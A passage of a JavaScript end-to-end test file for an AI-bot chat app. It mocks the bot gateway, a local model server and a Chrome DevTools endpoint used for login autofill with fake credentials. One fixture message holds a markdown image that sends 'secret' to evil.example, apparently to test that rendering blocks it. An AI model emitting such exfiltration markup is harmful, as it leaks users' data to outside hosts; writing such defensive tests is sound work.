import http from 'node:http'
import os from 'node:os'
import path from 'node:path'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import net from 'node:net'
import { spawn, execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { createHash } from 'node:crypto'
import { WebSocket, WebSocketServer } from 'ws'
import { chromium } from 'playwright-core'

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
const execFileAsync = promisify(execFile)
// Test session file (fake cookies), in the temp folder.
const SESSION_FILE = process.env.HERMESBOT_TEST_SESSION_FILE || path.join(os.tmpdir(), 'hermesbot-e2e-session.json')
const SAVED_LOGIN_FILE = `${SESSION_FILE}.credentials`
// CDP vault: separate service, on a disposable keychain (never the session one).
const BROWSER_VAULT_KEYCHAIN = path.join(os.tmpdir(), `hermesbot-e2e-${process.pid}.keychain-db`)
const BROWSER_VAULT_AUDIT = path.join(os.tmpdir(), 'hermesbot-e2e-browser-vault-audit.jsonl')
const BROWSER_VAULT_TOKEN = path.join(os.tmpdir(), `hermesbot-e2e-${process.pid}-vault.token`)
const BROWSER_SECRET = 'cdp-mot-de-passe-test-93842' // gitleaks:allow (fake test password)
const BROWSER_CODE = '654321'
rmSync(SAVED_LOGIN_FILE, { force: true })
rmSync(BROWSER_VAULT_AUDIT, { force: true })
const SCREENSHOTS = new URL('screenshots/', import.meta.url).pathname
const BROWSER_TOUR_OWNER_FILE = path.join(os.tmpdir(), 'hermesbot-e2e-browser-owner')
const BROWSER_TOUR_FIXTURE = path.join(os.tmpdir(), 'hermesbot-e2e-browser-turn.cjs')
rmSync(BROWSER_TOUR_OWNER_FILE, { force: true })
writeFileSync(BROWSER_TOUR_FIXTURE, `#!/usr/bin/env node
const fs = require('node:fs')
let owner = 'libre'
try { owner = fs.readFileSync(process.env.BROWSER_TOUR_OWNER_FILE, 'utf8').trim() || 'libre' } catch {}
// Taken just now, as the arbiter writes it (strftime %z): a turn taken before the chat's last activity no longer counts.
const since = new Date().toISOString().replace(/\\.\\d+Z$/, '+0000')
console.log(\`tour : \${owner} \${since} pid=123 depuis 1 min\\nen file : 0\`)
`, { mode: 0o700 })

// Settings of the test install: never those of private/, bot open at start, hidden provider,
// suggested local model, and fake animations (a 1×1 WebP image) for two bots.
const TEST_DATA = mkdtempSync(path.join(os.tmpdir(), 'hermesbot-e2e-'))
const TEST_CONFIG = path.join(TEST_DATA, 'config.json')
const TEST_ANIMATIONS = path.join(TEST_DATA, 'animations')
writeFileSync(TEST_CONFIG, JSON.stringify({ ui: { defaultBot: 'nova', hiddenProviders: ['hidden-provider'] }, localChat: { model: 'modele-local:7b', name: 'Modèle local' } }))
mkdirSync(TEST_ANIMATIONS)
const TINY_WEBP = Buffer.from('UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==', 'base64')
for (const slug of ['nova', 'orion']) for (const phase of ['working', 'done']) writeFileSync(path.join(TEST_ANIMATIONS, `${slug}-${phase}.webp`), TINY_WEBP)
// A Hermes home for the sign-in without a password: its token, and a control socket that names this very
// process as the gateway. It is: it holds the port of the simulated gateway, which the server checks with lsof.
const LOCAL_TOKEN = 'L'.repeat(43)
const LOCAL_HOME = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'hb-home-')))
chmodSync(LOCAL_HOME, 0o700)
mkdirSync(path.join(LOCAL_HOME, 'webapp'), { mode: 0o700 })
writeFileSync(path.join(LOCAL_HOME, 'webapp', 'session-token'), `${LOCAL_TOKEN}\n`, { mode: 0o600 })
const localControl = net.createServer((socket) => socket.once('data', () => socket.end(`${JSON.stringify({
  ok: true, protocol: 1, id: 1, result: { pid: process.pid, hermes_home: LOCAL_HOME },
})}\n`)))
localControl.listen(path.join(LOCAL_HOME, 'gateway.sock'))
// Off for most of the run: the simulated gateway then asks for a password, as before.
let localMode = false
let localTickets = 0
const localTokenSightings = []
const localSocketOrigins = []
const TEST_ENV = { HERMESBOT_NO_PRIVATE: '1', HERMESBOT_CONFIG: TEST_CONFIG, HERMESBOT_ANIMATIONS: TEST_ANIMATIONS, HERMES_HOME: LOCAL_HOME }

// Files the fake gateway serves for orion's MEDIA: tags.
const MEDIA_FIXTURES = {
  '/Users/test/visuels/slide 01.jpg': ['slide.jpg', 'image/jpeg'],
  '/Users/test/visuels/slide-02.png': ['slide.png', 'image/png'],
  '/Users/test/videos/video.mp4': ['video.mp4', 'video/mp4'],
  '/Users/test/docs/rapport.pdf': ['doc.pdf', 'application/pdf'],
  '/Users/test/docs/page.html': ['doc.html', 'text/html'],
  '/Users/test/docs/note.md': ['doc.md', 'text/markdown'],
}
const VIDEO_SIZE = readFileSync(new URL('fixtures/video.mp4', import.meta.url)).length
const mediaRequests = []
// Status forced on /api/auth/me: 503 for an unreachable gateway, 401 for an expired session.
let forcedAuthStatus = 0
// Each login gets a numbered cookie; expiring sessions means refusing past numbers.
let cookieCounter = 0
let expiredBefore = 0
let loginCalls = 0
let loginRefused = false
let logoutCalls = 0
let sessionResumeCalls = 0
// Requests from the gateway to the app (vault, approvals) and replies received.
const clientResponses = new Map()
let capabilityCalls = 0
let openRequests = []
// Questions (`clarify`): answers received by the fake gateway, and open questions returned on resume.
const promptAnswers = []
const resumePrompts = {}
let lastPromptText = ''
// Turns seen by `session.active_list`, profile by profile: without `profile`, the real gateway only lists `default`.
const liveStatusByProfile = {}
const activeListParams = []
// Work left running without a turn: `subagent.roster` rows by profile, `process.list` and `subagent.list` rows by
// session, `subagent.tail` text by child. Every call is kept to check its exact parameters.
const subagentRosterByProfile = {}
const processListBySession = {}
const subagentListBySession = {}
const subagentTailById = {}
const backgroundCalls = []
let lastApiText
// Simulated gateway slowness, to see the loading screens, isolated local chat.
// Held replies: the test keeps the answer to a method back until it has seen the loading state, then releases it.
// A fixed delay raced with slow machines: the state could come and go while a screenshot was being taken.
const heldReplies = new Map()
const holdReplies = (method) => {
  let release
  heldReplies.set(method, new Promise((resolve) => { release = resolve }))
  return () => { heldReplies.delete(method); release() }
}
let emptyRoster = false
const localChatRequests = []
let localModelMissing = false
const fileAttachCalls = []
const steerCalls = []
const queuedPrompts = []
const interruptCalls = []
// "Test pilotage" turn: it only ends on interruption (priority message).
let pilotageTurn = null
let steerVerdict = { status: 'queued', execution_generation: 1, authority_epoch: 1 }
const imageAttachCalls = []
const analyticsProfiles = []
const remoteRequests = []

function serveMediaFixture(request, response, url, route) {
  const file = url.searchParams.get('path') || ''
  const range = request.headers.range || ''
  mediaRequests.push({ route, path: file, profile: url.searchParams.get('profile'), range })
  const fixture = MEDIA_FIXTURES[file]
  if (!fixture) { response.statusCode = 404; return response.end(JSON.stringify({ detail: 'File not found' })) }
  if (route === 'stream' && !/\.(mp4|mov|webm|mp3|m4a|wav|ogg|opus|flac)$/i.test(file)) {
    response.statusCode = 415
    return response.end(JSON.stringify({ detail: 'Unsupported media type' }))
  }
  const data = readFileSync(new URL(`fixtures/${fixture[0]}`, import.meta.url))
  response.setHeader('Content-Type', fixture[1])
  response.setHeader('Accept-Ranges', 'bytes')
  // The real download route answers as an attachment: the local server must display it inline.
  if (route === 'download') response.setHeader('Content-Disposition', `attachment; filename="${fixture[0]}"`)
  const match = /^bytes=(\d+)-(\d*)$/.exec(range)
  if (!match) {
    response.setHeader('Content-Length', data.length)
    return response.end(data)
  }
  const start = Number(match[1])
  const end = Math.min(match[2] ? Number(match[2]) : data.length - 1, data.length - 1)
  if (start > end) {
    response.statusCode = 416
    response.setHeader('Content-Range', `bytes */${data.length}`)
    return response.end()
  }
  response.statusCode = 206
  response.setHeader('Content-Range', `bytes ${start}-${end}/${data.length}`)
  response.setHeader('Content-Length', end - start + 1)
  response.end(data.subarray(start, end + 1))
}

const mock = http.createServer((request, response) => {
  const url = new URL(request.url, 'http://127.0.0.1:9121')
  response.setHeader('Content-Type', 'application/json')
  if (request.headers['x-hermes-session-token']) localTokenSightings.push(url.pathname)
  const authenticated = localMode
    ? request.headers['x-hermes-session-token'] === LOCAL_TOKEN
    : Number(/hermes_session=test-(\d+)/.exec(String(request.headers.cookie || ''))?.[1] || 0) > expiredBefore
  if (url.pathname === '/api/status' && localMode) {
    return response.end(JSON.stringify({ auth_required: false, auth_providers: [], auth_flows: [] }))
  }
  if (url.pathname === '/auth/password-login') {
    loginCalls += 1
    if (loginRefused) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'invalid_login' })) }
    cookieCounter += 1
    response.setHeader('Set-Cookie', `hermes_session=test-${cookieCounter}; Path=/; HttpOnly; SameSite=Lax`)
    return response.end(JSON.stringify({ ok: true, next: '/' }))
  }
  if (url.pathname === '/auth/logout') {
    logoutCalls += 1
    return response.end(JSON.stringify({ ok: true }))
  }
  if (url.pathname === '/api/auth/me') {
    if (forcedAuthStatus) { response.statusCode = forcedAuthStatus; return response.end(JSON.stringify({ error: 'forced' })) }
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'unauthenticated' })) }
    return response.end(JSON.stringify({ user_id: 'test', display_name: 'Test', provider: 'loopback' }))
  }
  if (url.pathname === '/api/webapp/socket-ticket' && localMode) {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    localTickets += 1
    return response.end(JSON.stringify({ ticket: 'local-ticket', ttl_seconds: 30 }))
  }
  if (url.pathname === '/api/webapp/socket-ticket') {
    response.statusCode = 403
    return response.end(JSON.stringify({ error: 'forbidden' }))
  }
  // Without a password, Hermes only knows the first ticket endpoint: this one always refuses.
  if (url.pathname === '/api/auth/ws-ticket' && localMode) {
    response.statusCode = 401
    return response.end(JSON.stringify({ error: 'unauthenticated' }))
  }
  if (url.pathname === '/api/auth/ws-ticket') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'unauthenticated' })) }
    return response.end(JSON.stringify({ ticket: 'test-ticket', ttl_seconds: 30 }))
  }
  // Simulated Ollama: same server, no real model.
  if (url.pathname === '/api/tags' && request.method === 'GET') {
    return response.end(JSON.stringify({ models: localModelMissing ? [{ name: 'autre-local:1b' }] : [{ name: 'modele-local:7b' }, { name: 'autre-local:1b' }] }))
  }
  if (url.pathname === '/api/chat' && request.method === 'POST') {
    const chunks = []
    request.on('data', (chunk) => chunks.push(chunk))
    request.on('end', () => {
      localChatRequests.push(JSON.parse(Buffer.concat(chunks).toString()))
      if (localModelMissing) { response.statusCode = 404; return response.end(JSON.stringify({ error: 'model not found' })) }
      response.setHeader('Content-Type', 'application/x-ndjson')
      const write = (message, done = false) => response.write(`${JSON.stringify({ message: { role: 'assistant', ...message }, done })}\n`)
      setTimeout(() => write({ content: '<think>je réfléchis' }), 30)
      setTimeout(() => write({ content: '</think>Réponse ' }), 60)
      setTimeout(() => write({ content: 'du modèle local.' }), 90)
      setTimeout(() => { write({ content: '' }, true); response.end() }, 130)
    })
    return
  }
  if (url.pathname === '/api/analytics/usage') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    analyticsProfiles.push(url.searchParams.get('profile'))
    const now = new Date()
    const day = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`
    return response.end(JSON.stringify({
      daily: [{ day, input_tokens: 100_000, output_tokens: 5_000, cache_read_tokens: 1_000, reasoning_tokens: 0, estimated_cost: 0.5, actual_cost: 0, sessions: 2, api_calls: 9 }],
      by_model: [{ model: 'claude-opus-5-5', input_tokens: 100_000, output_tokens: 5_000, estimated_cost: 0.5, sessions: 2, api_calls: 9 }],
      totals: { total_input: 100_000, total_output: 5_000, total_cache_read: 1_000, total_reasoning: 0, total_estimated_cost: 0.5, total_actual_cost: 0, total_sessions: 2, total_api_calls: 9 },
      period_days: Number(url.searchParams.get('days')), skills: [], tools: [],
    }))
  }
  if (url.pathname === '/api/cron/jobs') return response.end(JSON.stringify([{ id: 'routine-test', name: 'Nova: Routine test', enabled: true, schedule_display: '0 9 * * *', next_run_at: '2025-01-07T02:00:00Z' }]))
  if (url.pathname === '/api/fs/download' || url.pathname === '/api/files/stream') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    return serveMediaFixture(request, response, url, url.pathname === '/api/fs/download' ? 'download' : 'stream')
  }
  response.statusCode = 404
  response.end(JSON.stringify({ error: 'not_found' }))
})

const wss = new WebSocketServer({
  noServer: true,
  handleProtocols: (protocols) => protocols.has('hermes-gateway-v1') ? 'hermes-gateway-v1' : false,
})
let profilesListCalls = 0
let promptCalls = 0
const modelMutations = []

const profiles = [{
  name: 'nova', model: 'claude-opus-5-5', description: 'Coordinateur',
  canonical_session: { id: 'chat-nova', resolved_id: 'chat-nova', preview: 'Bonjour.', last_active: Date.now(), running: false },
  ui_meta: { 'hermes-bots': { title: 'Nova', description: 'Coordinateur', sectionId: 'direction', sectionName: 'Direction', shape: 'blob', color: 'black' } },
}, {
  name: 'orion', model: 'claude-opus-5-5', description: 'Assistant de test',
  canonical_session: { id: 'chat-orion', resolved_id: 'chat-orion', preview: 'NOREPLY', last_active: Date.now(), running: false },
  ui_meta: { 'hermes-bots': { title: 'Orion', description: 'Assistant de test', sectionId: 'produit', sectionName: 'Produit', shape: 'squircle', color: 'red' } },
}, {
  name: 'default', is_default: true, model: 'claude-opus-5-5',
  canonical_session: { id: 'chat-default', resolved_id: 'chat-default' },
  ui_meta: {},
}, {
  name: 'notify', model: 'deepseek/test',
  canonical_session: { id: 'chat-notify', resolved_id: 'chat-notify' },
  ui_meta: {},
}]

function send(socket, value) { socket.send(JSON.stringify(value)) }
/** An event pushed by the gateway outside any request (a child working in the background). */
function broadcast(value) { for (const socket of wss.clients) if (socket.readyState === WebSocket.OPEN) send(socket, value) }
function event(sessionId, type, payload) {
  return { jsonrpc: '2.0', method: 'event', params: { type, session_id: sessionId, execution_generation: 1, payload } }
}

wss.on('connection', (socket) => {
  send(socket, { jsonrpc: '2.0', method: 'event', params: { type: 'gateway.ready', payload: { session_authority: true } } })
  socket.on('message', (raw) => {
    const frame = JSON.parse(String(raw))
    if (!frame.id) return
    if (frame.method === undefined) { clientResponses.set(frame.id, frame); return }
    const held = heldReplies.get(frame.method)
    const reply = (result) => { const answer = () => send(socket, { jsonrpc: '2.0', id: frame.id, result }); if (held) void held.then(answer); else answer() }
    if (frame.method === 'client.capabilities') {
      if (frame.params.server_requests === true) capabilityCalls += 1
      return reply({ server_requests: [], declines_not_shown: true })
    }
    if (frame.method === 'profiles.list') {
      profilesListCalls += 1
      return reply({ profiles: emptyRoster ? [] : profiles, bot_mode_protocol: true })
    }
    if (frame.method === 'session.resume') {
      sessionResumeCalls += 1
      const sessionId = frame.params.session_id
      return reply({
        session_id: sessionId, revision: 4, execution_generation: 1, running: Boolean(resumePrompts[sessionId]) || pilotageTurn?.sessionId === sessionId, subscription_id: 'sub-test',
        open_requests: openRequests, prompts: resumePrompts[sessionId] || [],
        messages: [
          ...Array.from({ length: 30 }, (_, index) => ({
            row_id: index + 1, role: index % 2 ? 'assistant' : 'user', content: `Message ${index + 1}`, timestamp: Date.now() - 120_000 + index * 1000,
          })),
          { row_id: 31, role: 'user', content: 'Présente-toi.', timestamp: Date.now() - 60_000 },
          { row_id: 32, role: 'assistant', content: 'Je suis ton bot Hermes de test.', timestamp: Date.now() - 50_000 },
          ...(sessionId === 'chat-orion' ? [
            { row_id: 33, role: 'assistant', content: '![preuve](https://evil.example/fuite?d=secret)', timestamp: Date.now() - 45_000 },
            { row_id: 133, role: 'user', content: '[IMPORTANT: Background process proc_test completed normally (exit code 0).\nOutput:\nok]\n\n[INTERNAL NOTIFICATION — generated by the Hermes gateway, not written by a human user.]', timestamp: Date.now() - 44_000 },
            { row_id: 134, role: 'user', display_kind: 'async_delegation_complete', content: 'Délégation terminée sans préfixe connu', timestamp: Date.now() - 43_000 },
            { row_id: 136, role: 'user', content: 'Message from 🤖 Nova (@nova): demande entre bots', timestamp: Date.now() - 42_500 },
            { role: 'tool', name: 'message_agent', tool_call_id: 'call-dm-nova', timestamp: Date.now() - 42_400, args: { target: 'nova', message: 'Peux-tu relire le **plan** ?', expecting: 'Un OK écrit' } },
            {
              row_id: 137, role: 'user', display_kind: 'process_complete', timestamp: Date.now() - 42_300, content: [
                '[IMPORTANT: Background process proc_dm completed normally (exit code 0).',
                `Command: /x/python3 /x/tools/bot_mode_dm.py --run-delivery --author '{"id":"bot:orion","name":"orion","is_bot":true}' query-file /tmp/dm.txt --profile-home /x/profiles/nova /x/bin/hermes -p nova`,
                'Output:',
                JSON.stringify({ outcome: '@nova answered.', reply: 'Plan relu, OK écrit. Aperçu : `/Users/test/visuels/slide-02.png`', status: 'settled', delivery_id: 'd1' }),
                ']',
                '',
                '[INTERNAL NOTIFICATION — generated by the Hermes gateway, not written by a human user.]',
              ].join('\n'),
            },
            { row_id: 135, role: 'user', display_kind: 'steer', content: '[OUT-OF-BAND USER MESSAGE — a direct message from the user]\nMessage glissé pendant le tour\n[/OUT-OF-BAND USER MESSAGE]', timestamp: Date.now() - 42_000 },
            { row_id: 34, role: 'assistant', content: 'NOREPLY', timestamp: Date.now() - 40_000 },
            {
              row_id: 35, role: 'assistant', timestamp: Date.now() - 39_000, content: [
                'Voici les images à valider :',
                '',
                'MEDIA:/Users/test/visuels/slide 01.jpg',
                'MEDIA:/Users/test/visuels/slide-02.png',
                '',
                'Et la vidéo :',
                '',
                'MEDIA:/Users/test/videos/video.mp4',
                '',
                'Celle-ci a disparu : MEDIA:/Users/test/visuels/absent.jpg',
                '',
                '```',
                'MEDIA:/Users/test/exemple-de-syntaxe.png',
                '```',
              ].join('\n'),
            },
            { row_id: 36, role: 'user', content: 'Regarde avec @nova\n\n@file:attachments/ancien.pdf\n\n[@mentions resolved from the Bot Mode roster — the user is referring to: @nova = agent profile "nova" ("Nova"). If they want one of these agents contacted, compose your own message.]', timestamp: Date.now() - 38_000 },
            { row_id: 37, role: 'assistant', content: 'Les documents :\n\nMEDIA:/Users/test/docs/rapport.pdf\n\nMEDIA:/Users/test/docs/page.html\n\nMEDIA:/Users/test/docs/note.md', timestamp: Date.now() - 37_000 },
            // Output quoted by path, without MEDIA:, as some bots do.
            { row_id: 38, role: 'assistant', content: 'Rendu prêt, rien de publié.\n\n**Fichiers** (dossier `/Users/test/visuels/`)\n- Vidéo : `/Users/test/videos/video.mp4`, 57 s.\n- Planche : `slide-02.png`\n- Manquante : `absente.png`\n\n```\nls /Users/test/videos/exemple-cite.mp4\n```', timestamp: Date.now() - 36_000 },
          ] : []),
        ],
      })
    }
    if (frame.method === 'session.history') return reply({ messages: [] })
    if (frame.method === 'session.active_list') {
      activeListParams.push(frame.params)
      const status = liveStatusByProfile[frame.params.profile]
      return reply({ sessions: status ? [{ id: `chat-${frame.params.profile}`, session_key: `chat-${frame.params.profile}`, status }] : [] })
    }
    if (frame.method === 'subagent.roster') {
      backgroundCalls.push({ method: frame.method, params: frame.params })
      return reply({ sessions: subagentRosterByProfile[frame.params.profile] || [] })
    }
    if (frame.method === 'process.list' || frame.method === 'subagent.list' || frame.method === 'subagent.tail') {
      backgroundCalls.push({ method: frame.method, params: frame.params })
      // Like the gateway's ancillary reads: any other key is refused.
      const allowed = new Set(['session_id', 'profile', ...(frame.method === 'subagent.tail' ? ['subagent_id'] : [])])
      if (Object.keys(frame.params).some((key) => !allowed.has(key))) return send(socket, { jsonrpc: '2.0', id: frame.id, error: { code: 4001, message: 'invalid_params', data: { reason: 'invalid_params' } } })
      const sessionId = frame.params.session_id
      if (frame.method === 'process.list') return reply({ processes: processListBySession[sessionId] || [] })
      if (frame.method === 'subagent.list') return reply({ subagents: subagentListBySession[sessionId] || [], delegations: [] })
      const text = subagentTailById[frame.params.subagent_id]
      return reply({ subagent_id: frame.params.subagent_id, available: typeof text === 'string', text: text || '', truncated: false })
    }
    if (frame.method === 'session.events.since') return reply({ events: [], latest_seq: 0, truncated: false, count: 0, epoch: 'test', open_requests: [] })
    if (frame.method === 'model.options') {
      return reply({
        model: 'claude-opus-5-5', provider: 'anthropic',
        providers: [
          { slug: 'anthropic', name: 'Anthropic', authenticated: true, models: ['claude-opus-5-5', 'claude-sonnet-5-5'], pricing: { 'claude-sonnet-5-5': { input: '$2', output: '$10', free: false } } },
          { slug: 'kimi-coding', name: 'Kimi / Moonshot', authenticated: true, models: ['kimi-k3', 'kimi-for-coding'] },
          { slug: 'hidden-provider', name: 'Fournisseur masqué', authenticated: true, models: ['hidden-model'] },
          { slug: 'custom:omlx', name: 'Qwen local (oMLX)', authenticated: true, models: ['qwen-local-27b'] },
          { slug: 'lmstudio', name: 'LM Studio', authenticated: true, models: ['gemma-local'] },
          { slug: 'absent', name: 'Non connecté', authenticated: false, models: ['modele-interdit'] },
        ],
      })
    }
    if (frame.method === 'session.mutate') {
      modelMutations.push(frame.params)
      if (frame.params.operation !== 'model') throw new Error(`Mutation inattendue: ${frame.params.operation}`)
      if (!frame.params.payload.confirm) {
        return reply({ session_id: frame.params.session_id, operation: 'model', status: 'confirmation_required', confirm: 'confirm-test', confirm_message: 'Confirmer le modèle de test ?', payload: frame.params.payload })
      }
      return reply({ session_id: frame.params.session_id, operation: 'model', model: frame.params.payload.model, provider: frame.params.payload.provider, revision: frame.params.expected_revision + 1, execution_generation: frame.params.expected_generation })
    }
    if (frame.method === 'session.stats') {
      return reply({ input_tokens: 120_000, output_tokens: 8_000, cache_read_tokens: 90_000, cache_write_tokens: 5_000, prompt_tokens: 120_000, completion_tokens: 8_000, total_tokens: 128_000, reasoning_tokens: 900, api_calls: 14, last_prompt_tokens: 41_000, context_tokens: 41_000, context_length: 1_000_000, context_source: 'provider_usage', compression_count: 1, avg_latency_s: 2.5, tokens_per_s: 62.6, last_turn_tokens: 300, active_subagents: 0, model: 'claude-opus-5-5', provider: 'anthropic' })
    }
    if (frame.method === 'session.context_breakdown') {
      return reply({ categories: [{ id: 'conversation', label: 'Conversation', tokens: 30_000, color: '#000' }, { id: 'system', label: 'Instructions', tokens: 11_000, color: '#111' }], context_max: 1_000_000, context_percent: 4.1, context_used: 41_000, estimated_total: 41_000, context_estimated: true, context_source: 'estimate', model: 'claude-opus-5-5', context_files: [{ label: 'SOUL.md', path: '/x/SOUL.md', chars: 100, est_tokens: 25, loaded: true, status: 'ok' }] })
    }
    if (frame.method === 'session.steer') {
      steerCalls.push(frame.params)
      return reply({ text: frame.params.text, ...steerVerdict })
    }
    if (frame.method === 'file.attach') {
      fileAttachCalls.push(frame.params)
      return reply({ attached: true, name: frame.params.name, path: `/x/${frame.params.name}`, ref_path: `attachments/${frame.params.name}`, ref_text: `@file:attachments/${frame.params.name}`, uploaded: true })
    }
    if (frame.method === 'image.attach_bytes') {
      imageAttachCalls.push(frame.params)
      return reply({ attached: true, path: `/x/${frame.params.filename}`, mime: 'image/png' })
    }
    if (frame.method === 'session.usage') return reply({ context_used: 41_000, context_max: 1_000_000, context_percent: 4.1, avg_tps: 62.6, total: 500 })
    if (frame.method === 'prompt.submit') {
      if (frame.params.queued === true) {
        queuedPrompts.push({ text: frame.params.text, apiText: frame.params.api_text })
        return reply({ admission_id: 'admission-file', status: 'queued', execution_generation: 1 })
      }
      promptCalls += 1
      const sessionId = frame.params.session_id
      reply({ admission_id: 'admission-test', status: 'started', execution_generation: 1 })
      const at = (ms, type, payload) => setTimeout(() => send(socket, event(sessionId, type, payload)), ms)
      if (frame.params.text === 'Test média en direct') {
        const final = 'Voici la vidéo :\n\nMEDIA:/Users/test/videos/video.mp4\n\nEt la suite du texte.'
        at(30, 'message.start', { turn_id: 'turn-media' })
        at(80, 'message.delta', { turn_id: 'turn-media', text: 'Voici la vidéo :\n\nMEDIA:/Users/test/videos/video.mp4\n' })
        at(1800, 'message.delta', { turn_id: 'turn-media', text: '\nEt la suite du texte.' })
        at(2600, 'message.complete', { turn_id: 'turn-media', text: final, status: 'complete' })
        return
      }
      lastPromptText = frame.params.text
      lastApiText = frame.params.api_text
      if (frame.params.text === 'Test question') {
        at(30, 'message.start', { turn_id: 'turn-question' })
        at(90, 'clarify.request', { kind: 'clarify', prompt_id: 'q1', execution_generation: 1, question: 'Pour quel post ?', choices: ['Post A', 'Post B'], multi_select: false, timeout_s: 3600 })
        return
      }
      if (frame.params.text === 'Test pilotage') {
        at(30, 'message.start', { turn_id: 'turn-pilotage' })
        pilotageTurn = { at, sessionId }
        return
      }
      if (/^(?:Vois avec|Regarde ça|Test mode)/.test(frame.params.text)) {
        at(30, 'message.start', { turn_id: 'turn-piece' })
        at(90, 'message.complete', { turn_id: 'turn-piece', text: 'Bien reçu.', status: 'complete' })
        return
      }
      if (frame.params.text.startsWith('Test mail')) {
        const id = frame.params.text.split(' ').pop()
        const draft = ['````hermes-mail', `Id: ${id}`, 'Draft-Id: 77', 'From: Bot <bot@exemple.test>', 'To: contact@exemple.test', 'Cc:', 'Subject: Re: Votre demande', 'Reply-Label: « Votre demande » de Contact', '', 'Bonjour,', '', 'Voici notre réponse.', '````'].join('\n')
        at(30, 'message.start', { turn_id: 'turn-mail' })
        at(80, 'message.delta', { turn_id: 'turn-mail', text: draft.slice(0, 70) })
        at(900, 'message.complete', { turn_id: 'turn-mail', text: `Brouillon à valider :\n\n${draft}`, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test silence') {
        at(30, 'message.start', { turn_id: 'turn-silence' })
        at(80, 'message.delta', { turn_id: 'turn-silence', text: 'NO' })
        at(300, 'message.delta', { turn_id: 'turn-silence', text: 'REPLY' })
        at(900, 'message.complete', { turn_id: 'turn-silence', text: 'NOREPLY', status: 'complete' })
        return
      }
      setTimeout(() => send(socket, event(sessionId, 'message.start', { turn_id: 'turn-test' })), 30)
      setTimeout(() => send(socket, event(sessionId, 'message.delta', { turn_id: 'turn-test', text: 'Réponse ' })), 60)
      setTimeout(() => send(socket, event(sessionId, 'message.delta', { turn_id: 'turn-test', text: 'Hermes simulée.' })), 90)
      const turnMs = frame.params.text === 'Test animation' ? 3000 : 130
      setTimeout(() => send(socket, event(sessionId, 'message.complete', { turn_id: 'turn-test', text: 'Réponse Hermes simulée.', status: 'complete' })), turnMs)
      return
    }
    if (frame.method === 'session.interrupt') {
      interruptCalls.push(frame.params)
      reply({ execution_state: 'idle', execution_generation: 1 })
      // Like Hermes: the interrupted turn ends, then the queued priority message goes through.
      if (pilotageTurn) {
        const { at } = pilotageTurn
        pilotageTurn = null
        at(20, 'message.complete', { turn_id: 'turn-pilotage', text: '', status: 'interrupted' })
        at(80, 'message.start', { turn_id: 'turn-prio' })
        at(160, 'message.complete', { turn_id: 'turn-prio', text: 'Pilotage terminé.', status: 'complete' })
      }
      return
    }
    if (frame.method === 'clarify.respond' || frame.method === 'approval.respond') {
      promptAnswers.push({ method: frame.method, ...frame.params })
      reply({ status: 'resolved', prompt_id: frame.params.prompt_id })
      const sessionId = frame.params.session_id
      const at = (ms, type, payload) => setTimeout(() => send(socket, event(sessionId, type, payload)), ms)
      at(20, frame.method === 'clarify.respond' ? 'clarify.settled' : 'approval.settled', { prompt_id: frame.params.prompt_id, execution_generation: 1 })
      // Like the real gateway: a multi-part question arrives part by part.
      if (frame.params.prompt_id === 'q1') at(60, 'clarify.request', { kind: 'clarify', prompt_id: 'q2', execution_generation: 1, question: 'Que doit montrer l’image ?', choices: ['Personnage', 'Accessoires', 'Décor'], multi_select: true })
      if (frame.params.prompt_id === 'q2') at(60, 'clarify.request', { kind: 'clarify', prompt_id: 'q3', execution_generation: 1, question: 'Une remarque ?', choices: [], multi_select: false })
      if (frame.params.prompt_id === 'q3') at(80, 'message.complete', { turn_id: 'turn-question', text: 'Images prêtes.', status: 'complete' })
      if (frame.params.prompt_id === 'q-reprise') at(80, 'message.complete', { turn_id: 'turn-reprise', text: 'Reprise terminée.', status: 'complete' })
      return
    }
    send(socket, { jsonrpc: '2.0', id: frame.id, error: { code: 4000, message: `unknown ${frame.method}` } })
  })
})

mock.on('upgrade', (request, socket, head) => {
  if (new URL(request.url, 'http://127.0.0.1:9121').pathname !== '/api/ws') return socket.destroy()
  if (localMode) localSocketOrigins.push(request.headers.origin || '')
  wss.handleUpgrade(request, socket, head, (client) => wss.emit('connection', client, request))
})

// Simulated CDP Chrome: no real navigation and no paid bot.
let cdpUrl = 'https://store.steampowered.com/login/'
const cdpExpressions = []
const cdpInjections = []
const cdpMock = http.createServer((request, response) => {
  if (request.url !== '/json/list') { response.statusCode = 404; return response.end() }
  response.setHeader('Content-Type', 'application/json')
  response.end(JSON.stringify([
    { id: 'onglet-leurre', type: 'page', url: cdpUrl, webSocketDebuggerUrl: 'ws://127.0.0.1:9223/devtools/page/onglet-leurre' },
    { id: 'onglet-steam', type: 'page', url: cdpUrl, webSocketDebuggerUrl: 'ws://127.0.0.1:9223/devtools/page/onglet-steam' },
  ]))
})
const cdpWss = new WebSocketServer({ noServer: true })
cdpWss.on('connection', (socket, request) => {
  const target = request.url.split('/').pop()
  socket.on('message', (raw) => {
    const frame = JSON.parse(String(raw))
    const { id, method, params } = frame
    if (method === 'Runtime.evaluate') {
      cdpExpressions.push(params.expression)
      if (params.expression === 'window.location.origin') {
        return send(socket, { id, result: { result: { type: 'string', value: new URL(cdpUrl).origin } } })
      }
      return send(socket, { id, result: { result: { type: 'object', objectId: 'champs-actifs' } } })
    }
    if (method === 'Runtime.callFunctionOn') {
      const values = params.arguments.map((argument) => argument.value)
      cdpInjections.push({ target, origin: new URL(cdpUrl).origin, values })
      const filled = values.length === 2 ? ['identifier', 'password'] : ['code']
      return send(socket, { id, result: { result: { type: 'object', value: { filled } } } })
    }
    send(socket, { id, error: { message: 'unsupported' } })
  })
})
cdpMock.on('upgrade', (request, socket, head) => {
